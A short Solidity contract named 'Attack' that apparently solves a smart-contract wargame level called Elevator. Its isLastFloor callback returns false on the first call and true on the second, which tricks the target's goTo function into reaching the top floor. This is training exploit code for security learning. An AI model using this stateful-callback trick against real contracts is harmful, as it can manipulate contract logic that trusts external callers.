// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IElevator{
  function goTo(uint)external;
}
contract Attack{
    uint i=0;//keeping track of whether the call is even or odd
    function attack(IElevator elevator)public{
        elevator.goTo(100);
    }
    function isLastFloor(uint floor)external returns(bool){
        if(i%2==0){
            i++;
            return false;//every odd call of function isLastFloor() will return false
        }
        return true;//every even call of functoin isLastFloor() will return true
    }
}